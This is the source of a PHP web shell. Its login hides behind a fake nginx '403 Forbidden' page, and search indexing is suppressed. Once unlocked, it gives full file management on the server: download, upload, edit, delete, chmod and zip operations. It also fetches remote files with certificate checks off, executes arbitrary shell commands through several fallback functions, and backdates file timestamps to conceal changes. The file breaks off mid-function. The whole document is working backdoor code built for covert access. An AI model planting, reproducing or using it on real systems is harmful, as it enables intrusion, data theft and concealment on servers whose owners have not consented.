<?php

$auth_pass = '$2y$12$fkOCJdGpv6xhEU6A131oDOICv5koMMgj95ISmFJUCiP8rI/Y9aGqa';

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v, time() + 86400 * 30, "/");
}

if (!empty($auth_pass)) {
    
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $auth_pass)) {
        VEsetcookie(md5($_SERVER['HTTP_HOST']), md5($auth_pass));
    }

    
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != md5($auth_pass))) {
        Login();
    }
}

/* ---------- Security Headers ---------- */
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

/* ---------- Util & Polyfills ---------- */
if (!function_exists('is_fn_usable')) {
    function is_fn_usable($fn) {
        if (!function_exists($fn)) return false;
        $disabled = (string) @ini_get('disable_functions');
        $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist');
        $blocked = array();
        if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
        if ($suhosin  !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
        if (!empty($blocked)) {
            $blocked = array_filter(array_map('strtolower', $blocked));
            if (in_array(strtolower($fn), $blocked, true)) return false;
        }
        return true;
    }
}
function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

if (!function_exists('je')) {
    function je($v) {
        if (function_exists('json_encode')) {
            return json_encode($v);
        }
        if (is_bool($v)) return $v ? 'true' : 'false';
        if (is_numeric($v)) return (string)$v;
        if ($v === null) return 'null';
        $s = str_replace(
            array("\\","\"","\r","\n","\t","/"),
            array("\\\\","\\\"","\\r","\\n","\\t","\\/"),
            (string)$v
        );
        return '"'.$s.'"';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        if (!is_string($a) || !is_string($b)) return false;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $res = 0;
        for ($i=0; $i<$len; $i++) $res |= ord($a[$i]) ^ ord($b[$i]);
        return $res === 0;
    }
}

function biru_random_bytes($len){
    if (is_fn_usable('random_bytes')) return random_bytes($len);
    if (is_fn_usable('openssl_random_pseudo_bytes')) {
        $strong = false;
        $b = openssl_random_pseudo_bytes($len, $strong);
        if ($b !== false && $strong) return $b;
    }
    $out = '';
    for ($i = 0; $i < $len; $i++) $out .= chr(mt_rand(0, 255));
    return $out;
}
function humanSize($b){
    $u = array('B','KB','MB','GB','TB'); $i = 0;
    while ($b >= 1024 && $i < count($u)-1){ $b/=1024; $i++; }
    return ($i ? number_format($b,2) : (string)$b) . ' ' . $u[$i];
}
function permsToString($f){
    $p = @fileperms($f); if ($p === false) return '??????????';
    $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $s  = (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-');
    $s .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-');
    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-');
    return $t.$s;
}
function modeFromInput($s){
    $s=trim($s); if ($s==='') return 0644;
    if (ctype_digit($s)){ if ($s[0]!=='0') $s='0'.$s; return intval($s,8); }
    return 0644;
}
function isTextFile($p){
    if (is_dir($p) || !is_file($p)) return false;
    $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION));
    $text = array('txt','md','json','js','ts','css','scss','less','html','htm','xml','svg','php','phtml','inc','ini','cfg','env','yml','yaml','py','rb','go','rs','c','h','cpp','hpp','java','kt','sql','csv','log');
    if (in_array($ext, $text, true)) return true;
    $s = @file_get_contents($p, false, null, 0, 2048);
    if ($s === false) return false;
    return (bool)preg_match('//u', $s);
}
function safeJoin($base,$child){
    $child = str_replace("\0",'',$child);
    if ($child==='') return $base;
    if ($child[0]===DIRECTORY_SEPARATOR || preg_match('~^[A-Za-z]:\\\\~',$child)) return $child;
    return rtrim($base,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$child;
}
function listDirEntries($dir){
    $h = @opendir($dir); if ($h===false) return array();
    $items=array(); while(false!==($e=readdir($h))){ if($e==='.'||$e==='..') continue; $items[]=$e; }
    closedir($h); return $items;
}
function rrmdir($p){
    if (!file_exists($p)) return true;
    if (is_file($p) || is_link($p)) return @unlink($p);
    $ok=true; $h=@opendir($p); if($h===false) return false;
    while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; $ok = rrmdir($p.DIRECTORY_SEPARATOR.$v) && $ok; }
    closedir($h);
    return @rmdir($p) && $ok;
}
function tryWriteFromTmp($tmp,$dest){
    $err=array(); if(@move_uploaded_file($tmp,$dest)) return array(true,null); $err[]='move_uploaded_file';
    if(@rename($tmp,$dest)) return array(true,null); $err[]='rename';
    if(@copy($tmp,$dest)) return array(true,null); $err[]='copy';
    $d=@file_get_contents($tmp); if($d!==false && @file_put_contents($dest,$d)!==false) return array(true,null); $err[]='get+put';
    $in=@fopen($tmp,'rb'); $out=@fopen($dest,'wb');
    if($in && $out){ $c=stream_copy_to_stream($in,$out); @fclose($in); @fclose($out); if($c!==false) return array(true,null); $err[]='stream_copy'; }
    else { $err[]='fopen'; }
    return array(false, implode('; ',$err).' failed');
}
if (!function_exists('fetchUrlToFile')) {
  function fetchUrlToFile($url, $dest) {
      $errs = array();
      if (is_fn_usable('curl_init')) {
          $ch = @curl_init($url);
          $fp = @fopen($dest, 'wb');
          if ($ch && $fp) {
              @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
              @curl_setopt($ch, CURLOPT_FILE, $fp);
              @curl_setopt($ch, CURLOPT_FAILONERROR, true);
              @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
              @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
              @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
              $ok = @curl_exec($ch);
              $e  = @curl_error($ch);
              @curl_close($ch);
              @fclose($fp);
              if ($ok) return array(true, null);
              $errs[] = 'cURL: ' . $e;
              @unlink($dest);
          } else {
              if ($ch) @curl_close($ch);
              if ($fp) @fclose($fp);
              $errs[] = 'init cURL/fopen';
          }
      }
      $ctx = @stream_context_create(array(
          'http' => array('follow_location' => 1, 'timeout' => 60, 'header' => "User-Agent: Mozilla/5.0\r\n"),
          'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false),
      ));
      if (@copy($url, $dest, $ctx)) return array(true, null);
      $errs[] = 'copy(url)';
      $d = @file_get_contents($url, false, $ctx);
      if ($d !== false && @file_put_contents($dest, $d) !== false) return array(true, null);
      $errs[] = 'get+put';
      $in  = @fopen($url, 'rb', false, $ctx);
      $out = @fopen($dest, 'wb');
      if ($in && $out) {
          $c = @stream_copy_to_stream($in, $out);
          @fclose($in); @fclose($out);
          if ($c !== false) return array(true, null);
          $errs[] = 'stream_copy';
          @unlink($dest);
      } else {
          $errs[] = 'fopen(url/dest)';
      }
      return array(false, implode('; ', $errs) . ' failed');
  }
}
function breadcrumbs($path){
    $out=array();
    if (preg_match('~^[A-Za-z]:\\\\~',$path)){
        $drive=substr($path,0,2); $rest=substr($path,2);
        $segments=array_values(array_filter(explode('\\\\',$rest),'strlen'));
        $acc=$drive.'\\'; $out[]=array($drive.'\\',$acc);
        foreach($segments as $s){ $acc.=$s.'\\'; $out[]=array($s,rtrim($acc,'\\')); }
    } else {
        $segments=array_values(array_filter(explode('/',$path),'strlen'));
        $acc='/'; $out[]=array('/','/');
        foreach($segments as $s){ $acc.=$s.'/'; $out[]=array($s,rtrim($acc,'/')); }
    }
    return $out;
}
function ensureCsrf(){}

function create_nonzero_file($path, $userContent = null){
    $default = "Created by Nothings @ ".date('c')."\n";
    $payload = (string)($userContent !== null ? $userContent : $default);
    if ($payload === '') $payload = $default;
    $w = @file_put_contents($path, $payload, LOCK_EX);
    if ($w !== false && $w > 0) return array(true, 'file_put_contents');
    $fp = @fopen($path, 'wb');
    if ($fp){
        $wr = @fwrite($fp, $payload);
        @fclose($fp);
        if ($wr !== false && $wr > 0) return array(true, 'fopen+fwrite');
    }
    $tmp = @tempnam(sys_get_temp_dir(), 'blue_');
    if ($tmp){
        @file_put_contents($tmp, $payload);
        if (@rename($tmp, $path)) {
            if (@filesize($path) > 0) return array(true, 'tempnam+rename');
        } elseif (@copy($tmp, $path)) {
            @unlink($tmp);
            if (@filesize($path) > 0) return array(true, 'tempnam+copy');
        }
        @unlink($tmp);
    }
    return array(false, 'All methods failed');
}

function svgIcon($name,$class='ico'){
    $icons=array(
        'folder'=>'<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M10 4l2 2h6a2 2 0 012 2v1H4V6a2 2 0 012-2h4z" fill="currentColor" opacity=".12"/><path d="M3 9h18v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" fill="currentColor"/></svg>',
        'file'=>'<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M13 3v5a2 2 0 002 2h5" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>',
        'code'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M8 16l-4-4 4-4M16 8l4 4-4 4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
        'text'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M4 6h16M4 12h16M4 18h10" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
        'pwx'=>'<svg viewBox="0 0 48 48" class="'.$class.'" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><g fill="currentColor"><g transform="translate(-700 -560)"><path d="M723.9985,560 C710.746,560 700,570.787092 700,584.096644 C700,594.740671 706.876,603.77183 716.4145,606.958412 C717.6145,607.179786 718.0525,606.435849 718.0525,605.797328 C718.0525,605.225068 718.0315,603.710086 718.0195,601.699648 C711.343,603.155898 709.9345,598.469394 709.9345,598.469394 C708.844,595.686405 707.2705,594.94548 707.2705,594.94548 C705.091,593.450075 707.4355,593.480194 707.4355,593.480194 C709.843,593.650366 711.1105,595.963499 711.1105,595.963499 C713.2525,599.645538 716.728,598.58234 718.096,597.964902 C718.3135,596.407754 718.9345,595.346062 719.62,594.743683 C714.2905,594.135281 708.688,592.069123 708.688,582.836167 C708.688,580.205279 709.6225,578.054788 711.1585,576.369634 C710.911,575.759726 710.0875,573.311058 711.3925,569.993458 C711.3925,569.993458 713.4085,569.345902 717.9925,572.46321 C719.908,571.928599 721.96,571.662047 724.0015,571.651505 C726.04,571.662047 728.0935,571.928599 730.0105,572.46321 C734.5915,569.345902 736.603,569.993458 736.603,569.993458 C737.9125,573.311058 737.089,575.759726 736.8415,576.369634 C738.3805,578.054788 739.309,580.205279 739.309,582.836167 C739.309,592.091712 733.6975,594.129257 728.3515,594.725612 C729.2125,595.469549 729.9805,596.939353 729.9805,599.18773 C729.9805,602.408949 729.9505,605.006706 729.9505,605.797328 C729.9505,606.441873 730.3825,607.191834 731.6005,606.9554 C741.13,603.762794 748,594.737659 748,584.096644 C748,570.787092 737.254,560 723.9985,560"/></g></g></svg>',
        'img'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M4 5h16v14H4z" fill="currentColor" opacity=".12"/><circle cx="8.5" cy="9.5" r="1.5" fill="currentColor"/><path d="M4 16l4-4 3 3 3-2 6 5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
        'pdf'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><text x="7" y="17" font-size="8" font-family="ui-sans-serif" fill="currentColor">PDF</text></svg>',
        'sheet'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h12a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M8 8h8M8 12h8M8 16h8" stroke="currentColor" stroke-width="2"/></svg>',
        'zip'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><path d="M6 3h7l5 5v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5" fill="currentColor" opacity=".12"/><path d="M11 5h2v2h-2v2h2v2h-2" stroke="currentColor" stroke-width="2"/></svg>',
        'db'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><ellipse cx="12" cy="6" rx="8" ry="3" fill="currentColor" opacity=".12"/><path d="M4 6v12c0 1.7 3.6 3 8 3s8-1.3 8-3V6" fill="none" stroke="currentColor" stroke-width="2"/></svg>',
        'search'=>'<svg viewBox="0 0 24 24" class="'.$class.'"><circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2" fill="none"/><path d="M20 20l-3-3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
    );
    return isset($icons[$name]) ? $icons[$name] : $icons['file'];
}
function iconSvgFor($p){
    if (is_dir($p)) return svgIcon('folder');
    $e=strtolower(pathinfo($p, PATHINFO_EXTENSION));
    if (in_array($e,array('zip','rar','7z'))) return svgIcon('zip');
    if (in_array($e,array('jpg','jpeg','png','gif','webp','bmp','svg'))) return svgIcon('img');
    if (in_array($e,array('pdf'))) return svgIcon('pdf');
    if (in_array($e,array('csv','xls','xlsx'))) return svgIcon('sheet');
    if (in_array($e,array('sql'))) return svgIcon('db');
    if (in_array($e,array('php','js','ts','css','scss','less','html','htm','xml','yml','yaml','ini','cfg'))) return svgIcon('code');
    if (in_array($e,array('txt','md','log','json'))) return svgIcon('text');
    return svgIcon('file');
}

if(!function_exists('make_cd_prefix')){
    function make_cd_prefix($cwd){
        if(!$cwd) return '';
        if(DIRECTORY_SEPARATOR==='\\') return 'cd /d '.escapeshellarg($cwd).' && ';
        return 'cd '.escapeshellarg($cwd).' && ';
    }
}
if(!function_exists('wrap_cmd_for_shell')){
    function wrap_cmd_for_shell($cmd){
        if(DIRECTORY_SEPARATOR==='\\') return 'cmd.exe /C '.$cmd;
        return '/bin/sh -c '.escapeshellarg($cmd);
    }
}

if(!function_exists('run_with_proc_open')){
    function run_with_proc_open($cmd,$cwd=null,$timeout=30){
        if(!is_fn_usable('proc_open')) return null;
        $des=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')); $pipes=array(); $proc=@proc_open($cmd,$des,$pipes,$cwd?:null,null);
        if(!is_resource($proc)) return null;
        if(isset($pipes[1])&&is_resource($pipes[1])) @stream_set_blocking($pipes[1],false);
        if(isset($pipes[2])&&is_resource($pipes[2])) @stream_set_blocking($pipes[2],false);
        if(isset($pipes[0])&&is_resource($pipes[0])) @fclose($pipes[0]);
        $buf=''; $start=time();
        while(true){
            $status=@proc_get_status($proc); $running=$status && !empty($status['running']);
            $r=array(); if(isset($pipes[1])&&is_resource($pipes[1])) $r[]=$pipes[1]; if(isset($pipes[2])&&is_resource($pipes[2])) $r[]=$pipes[2];
            if($r){ $w=null;$e=null; @stream_select($r,$w,$e,1); foreach($r as $p){ $chunk=@fread($p,8192); if($chunk!==false && $chunk!=='') $buf.=$chunk; } }
            else { usleep(100000); }
            if(!$running) break;
            if($timeout>0 && (time()-$start)>=$timeout){
                @proc_terminate($proc,9);
                foreach($pipes as $p){ if(is_resource($p)) @fclose($p); }
                @proc_close($proc);
                return array('method'=>'proc_open','code'=>124,'out'=>$buf."\n[timeout after {$timeout}s]");
            }
        }
        foreach($pipes as $p){ if(is_resource($p)) @fclose($p); }
        $code=@proc_close($proc); if($code===-1) $code=null;
        return array('method'=>'proc_open','code'=>$code,'out'=>$buf);
    }
}
if(!function_exists('run_with_shell_exec')){
    function run_with_shell_exec($cmd,$cwd=null){
        if(!is_fn_usable('shell_exec')) return null;
        $full = make_cd_prefix($cwd) . $cmd . ' 2>&1';
        $out = @shell_exec($full); if($out===null) return null;
        return array('method'=>'shell_exec','code'=>null,'out'=>$out);
    }
}
if(!function_exists('run_with_exec')){
    function run_with_exec($cmd,$cwd=null){
        if(!is_fn_usable('exec')) return null;
        $full = make_cd_prefix($cwd) . $cmd  . ' 2>&1';
        $lines=array(); $code=0; @exec($full,$lines,$code);
        return array('method'=>'exec','code'=>$code,'out'=>implode("\n",(array)$lines));
    }
}
if(!function_exists('run_with_system')){
    function run_with_system($cmd,$cwd=null){
        if(!is_fn_usable('system')) return null;
        $full = make_cd_prefix($cwd) . $cmd . ' 2>&1';
        ob_start(); @system($full,$code); $out=ob_get_clean();
        return array('method'=>'system','code'=>$code,'out'=>$out);
    }
}
if(!function_exists('run_with_popen')){
    function run_with_popen($cmd,$cwd=null){
        if(!is_fn_usable('popen')) return null;
        $full = make_cd_prefix($cwd) . $cmd . ' 2>&1';
        $h=@popen(wrap_cmd_for_shell($full),'r'); if(!is_resource($h)) return null;
        $buf=''; while(!feof($h)){ $chunk=@fread($h,8192); if($chunk===false) break; $buf.=$chunk; }
        @pclose($h); return array('method'=>'popen','code'=>null,'out'=>$buf);
    }
}
if(!function_exists('run_command_all')){
    function run_command_all($cmd,$cwd=null){
        $po=run_with_proc_open($cmd,$cwd,30); if($po) return $po;
        $order=array('run_with_shell_exec','run_with_exec','run_with_system','run_with_popen');
        foreach($order as $fn){
            if(function_exists($fn)){ $res=$fn($cmd,$cwd); if($res) return $res; }
        }
        return array('method'=>'none','code'=>127,'out'=>"Command runner not available on this PHP build.");
    }
}

function biru_apply_chmod($path,$mode,$recursive,&$ok){
    if(!@chmod($path,$mode)) $ok=false;
    if($recursive && is_dir($path)){
        $h=@opendir($path);
        if($h!==false){
            while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; biru_apply_chmod($path.DIRECTORY_SEPARATOR.$v,$mode,true,$ok); }
            closedir($h);
        } else { $ok=false; }
    }
}
function biru_apply_mtime($path,$timestamp,$recursive,&$ok){
    if(!@touch($path,$timestamp,$timestamp)) $ok=false;
    if($recursive && is_dir($path)){
        $h=@opendir($path);
        if($h!==false){
            while(false!==($v=readdir($h))){ if($v==='.'||$v==='..') continue; biru_apply_mtime($path.DIRECTORY_SEPARATOR.$v,$timestamp,true,$ok); }
            closedir($h);
        } else { $ok=false; }
    }
}

/* =========================
 *        BOOT & ROUTER
 * ========================= */
$current = isset($_GET['p']) ? (string)$_GET['p'] : getcwd();
if (!is_dir($current)) $current = getcwd();
$current = rtrim($current, DIRECTORY_SEPARATOR);
if ($current === '') $current = DIRECTORY_SEPARATOR;

$action = isset($_GET['a']) ? $_GET['a'] : '';

if ($action === 'download') {
    $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
    if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($f).'"');
    header('Content-Length: '.filesize($f));
    header('X-Content-Type-Options: nosniff');
    readfile($f); exit;
}

if ($action === 'raw') {
    $f = safeJoin($current, isset($_GET['f']) ? $_GET['f'] : '');
    if (!is_file($f) || !is_readable($f)) { http_response_code(404); exit('Not found'); }
    $mime = 'application/octet-stream';
    if (is_fn_usable('finfo_open')) { $fi=@finfo_open(FILEINFO_MIME_TYPE); if($fi){ $det=@finfo_file($fi,$f); if($det) $mime=$det; @finfo_close($fi);} }
    elseif (is_fn_usable('mime_content_type')) { $tmp=@mime_content_type($f); if($tmp) $mime=$tmp; }
    header('Content-Type: '.$mime);
    header('Content-Length: '.filesize($f));
    header('X-Content-Type-Options: nosniff');
    header('Content-Disposition: inline; filename="'.basename($f).'"');
    readfile($f); exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ensureCsrf();
    $back = function () use ($current) { header('Location: ?p='.rawurlencode($current)); exit; };
    switch ($action) {
        case 'new-file': {
            $name = trim((string)(isset($_POST['name']) ? $_POST['name'] : ''));
            $content = isset($_POST['content']) ? (string)$_POST['content'] : null;
            if ($name === '' || strpos($name, DIRECTORY_SEPARATOR)!==false) { $_SESSION['msg']='New File: invalid name'; return $back(); }
            $dst = safeJoin($current, $name);
            if (file_exists($dst)) { $_SESSION['msg']='New File: already exists'; return $back(); }
            list($ok,$how) = create_nonzero_file($dst, $content);
            $_SESSION['msg'] = $ok ? ("New File OK via {$how}: ".$name) : ('New File failed: '.$how);
            return $back();
        }
        case 'new-dir': {
            $name = trim((string)(isset($_POST['name']) ? $_POST['name'] : ''));
            if ($name === '' || strpos($name, DIRECTORY_SEPARATOR)!==false) { $_SESSION['msg']='New Folder: invalid name'; return $back(); }
            $dst = safeJoin($current, $name);
            if (file_exists($dst)) { $_SESSION['msg']='New Folder: already exists'; return $back(); }
            $ok = @mkdir($dst, 0775, false);
            $_SESSION['msg'] = $ok ? ('New Folder OK: '.$name) : 'New Folder failed';
            return $back();
        }
        case 'edit-save': {
            $file = safeJoin($current, isset($_POST['file']) ? $_POST['file'] : '');
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            $mode = isset($_POST['mode']) ? $_POST['mode'] : 'txt';
            if (!is_file($file) || !is_writable($file)) { $_SESSION['msg']='Save failed (file not writable)'; return $back(); }
            if ($mode === 'b64') {
                $data = base64_decode($content, true);
                if ($data === false) { $_SESSION['msg']='Save failed: invalid Base64 data'; return $back(); }
                @file_put_contents($file, $data);
            } else {
                @file_put_contents($file, $content);
            }
            $_SESSION['msg'] = 'Saved: '.basename($file); return $back();
        }
        case 'rename': {
            $old = safeJoin($current, isset($_POST['old']) ? $_POST['old'] : '');
            $new = trim((string)(isset($_POST['new']) ? $_POST['new'] : ''));
            if ($new === '' || strpos($new, DIRECTORY_SEPARATOR) !== false) { $_SESSION['msg']='Invalid new name'; }
            else { $dst = safeJoin($current, $new); $_SESSION['msg'] = @rename($old,$dst) ? 'Rename OK' : 'Rename failed'; }
            return $back();
        }
        case 'chmod': {
            $target = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : '');
            $mode = modeFromInput((string)(isset($_POST['mode']) ? $_POST['mode'] : '0644'));
            $rec = !empty($_POST['recursive']); $ok=true; biru_apply_chmod($target,$mode,$rec,$ok);
            $_SESSION['msg'] = $ok ? 'Chmod OK' : 'Chmod partially failed'; return $back();
        }
        case 'delete': {
            $t = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : ''); $_SESSION['msg'] = rrmdir($t) ? 'Delete OK' : 'Delete failed'; return $back();
        }
        case 'mass-delete': {
            $arr = isset($_POST['items']) ? $_POST['items'] : array(); $ok=true;
            if (is_array($arr)) foreach ($arr as $n) { $ok = rrmdir(safeJoin($current,$n)) && $ok; }
            $_SESSION['msg'] = $ok ? 'Bulk delete OK' : 'Some items failed to delete'; return $back();
        }
        case 'upload': {
            if (!isset($_FILES['files'])) { $_SESSION['msg']='No files provided'; return $back(); }
            $c = count($_FILES['files']['name']); $ok=0; $fail=0; $fails=array();
            for ($i=0;$i<$c;$i++){
                $name=$_FILES['files']['name'][$i]; $tmp=$_FILES['files']['tmp_name'][$i]; $e=$_FILES['files']['error'][$i];
                if ($e!==UPLOAD_ERR_OK){ $fail++; $fails[]="$name (error $e)"; continue; }
                list($done,$why)=tryWriteFromTmp($tmp,safeJoin($current,$name));
                if ($done) $ok++; else { $fail++; $fails[]="$name ($why)"; }
            }
            $_SESSION['msg']="Upload: OK=$ok; Failed=$fail".($fails?'; '.implode(', ',$fails):''); return $back();
        }
        case 'url-upload': {
            $url = trim((string)(isset($_POST['url']) ? $_POST['url'] : ''));
            $fn  = trim((string)(isset($_POST['filename']) ? $_POST['filename'] : ''));
            if ($url===''){ $_SESSION['msg']='URL is empty'; return $back(); }
            if ($fn===''){ $path=parse_url($url,PHP_URL_PATH); $fn=basename($path?$path:''); if($fn===''){ $fn='download.bin'; } }
            list($ok,$w) = fetchUrlToFile($url, safeJoin($current,$fn));
            $_SESSION['msg'] = $ok ? "Downloaded from URL: $fn" : "URL download failed: $w"; return $back();
        }
        case 'mtime': {
            $target = safeJoin($current, isset($_POST['target']) ? $_POST['target'] : '');
            $input = trim((string)(isset($_POST['ts']) ? $_POST['ts'] : '')); $rec = !empty($_POST['recursive']);
            if ($input===''){ $_SESSION['msg']='Change Date: empty'; return $back(); }
            if (ctype_digit($input)) $ts=(int)$input; else { $ts=@strtotime($input); if($ts===false){ $_SESSION['msg']='Change Date: invalid time format'; return $back(); } }
            $ok=true; biru_apply_mtime($target,$ts,$rec,$ok);
            $_SESSION['msg'] = $ok ? ('Change Date OK → '.date('Y-m-d H:i:s',$ts)) : 'Change Date partially failed'; return $back();
        }
        case 'cmd': {
            $cmd = trim((string)(isset($_POST['cmd']) ? $_POST['cmd'] : ''));
            if ($cmd===''){ $_SESSION['msg']='Command is empty.'; return $back(); }
            $result = run_command_all($cmd, $current); $out=(string)$result['out'];
            if (strlen($out)>1024*1024) $out = substr($out,0,1024*1024)."\n[output truncated]";
            $_SESSION['cmd_result']=array('cmd'=>$cmd,'method'=>$result['method'],'code'=>$result['code'],'out'=>$out); return $back();
        }
        case 'move': {
            $srcName = (string)(isset($_POST['src']) ? $_POST['src'] : '');
            $dstDir  = (string)(isset($_POST['dst']) ? $_POST['dst'] : '');
            $srcFull = safeJoin($current, $srcName);
            if ($srcName==='' || !file_exists($srcFull)) { $_SESSION['msg']='Move failed: source missing'; return $back(); }
            if ($dstDir==='') { $_SESSION['msg']='Move failed: destination empty'; return $back(); }
            if (!is_dir($dstDir)) { $_SESSION['msg']='Move failed: destination is not a directory'; return $back(); }
            $dstFull = safeJoin($dstDir, basename($srcName));
            if (@realpath($srcFull)===@realpath($dstFull)) { $_SESSION['msg']='Move skipped (same location)'; return $back(); }
            $ok = @rename($srcFull, $dstFull);
            $_SESSION['msg'] = $ok ? 'Move OK' : 'Move failed';
            return $back();
        }
        case 'zip': {
            $items = isset($_POST['items']) ? $_POST['items'] : array();
            $name  = trim((string)(isset($_POST['zipname']) ? $_POST['zipname'] : ''));
            if (!is_array($items) || empty($items)) { $_SESSION['msg']='Zip failed: nothing selected'; return $back(); }
            if ($name==='') $name = 'archive-'.date('Ymd-His').'.zip';
            $archivePath = safeJoin($current, $name);
            $done=false; $err='';
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($archivePath, ZipArchive::CREATE|ZipArchive::OVERWRITE)===true) {
                    foreach ($items as $it) {
                        $full = safeJoin($current, $it);
                        if (is_dir($full)) {
                            $itClean = rtrim($it, DIRECTORY_SEPARATOR);
                            addDirToZip($zip, $full, $itClean);
                        } elseif (is_file($full)) {
                            $zip->addFile($full, basename($it));
                        }
                    }
                    $zip->close(); $done=true;
                } else { $err='ZipArchive open failed'; }
            }
            if (!$done) {
                if (class_exists('PharData')) {
                    try {
                        $tarName = preg_replace('~\.zip$~i', '.tar', $archivePath);
                        $phar = new PharData($tarName);
                        foreach ($items as $it) {
                            $full = safeJoin($current, $it);
                            if (is_dir($full)) {
                                $phar->addEmptyDir(basename($it));
                                addDirToPhar($phar, $full, basename($it));
                            } elseif (is_file($full)) {
                                $phar->addFile($full, basename($it));
                            }
                        }
                        unset($phar);
                        $_SESSION['msg']='ZipArchive not available; created TAR instead: '.basename($tarName);
                        return $back();
                    } catch (Exception $e) { $err = 'TAR fallback failed: '.$e->getMessage(); }
                } else {
                    $err = ($err ? $err.'; ' : '').'No ZipArchive nor PharData available';
                }
            }
            $_SESSION['msg'] = $done ? ('Archive created: '.basename($archivePath)) : ('Zip failed: '.$err);
            return $back();
        }
        case 'unzip': {
            $file = safeJoin($current, isset($_POST['file']) ? $_POST['file'] : '');
            if (!is_file($file)) { $_SESSION['msg']='Unzip failed: file not found'; return $back(); }
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $ok=false; $err='';
            if ($ext==='zip' && class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($file)===true) { $ok = $zip->extractTo($current); $zip->close(); if(!$ok) $err='Zip extractTo failed'; }
                else { $err='Zip open failed'; }
            } else {
                try {
                    if (class_exists('PharData') && preg_match('~\.(tar|tar\.gz|tar\.bz2|tar\.xz)$~i', $file)) {
                        $phar = new PharData($file);
                        $phar->extractTo($current, null, true);
                        $ok=true;
                    } else {
                        $err='Unsupported archive type or PharData not available';
                    }
                } catch (Exception $e) { $err=$e->getMessage(); }
            }
            $_SESSION['msg'] = $ok ? 'Unzip OK' : ('Unzip failed: '.$err);
            return $back();
        }
    }
}

function addDirToZip($zip, $dir, $local){
    $dir = rtrim($dir, DIRECTORY_SEPARATOR);
    if (method_exists($zip, 'addEmptyDir')) $zip->addEmptyDir($local);
    $h = @opendir($dir); if(!$h) return;
    while(false!==($e=readdir($h))){
        if($e==='.'||$e==='..') continue;
        $full = $dir.DIRECTORY_SEPARATOR.$e;
        $localPath = $local.'/'.basename($e);
        if (is_dir($full)) addDirToZip($zip, $full, $localPath);
        elseif (is_file($full) && method_exists($zip,'addFile')) $zip->addFile($full, $localPath);
    }
    closedir($h);
}
function addDirToPhar($phar, $dir, $local){
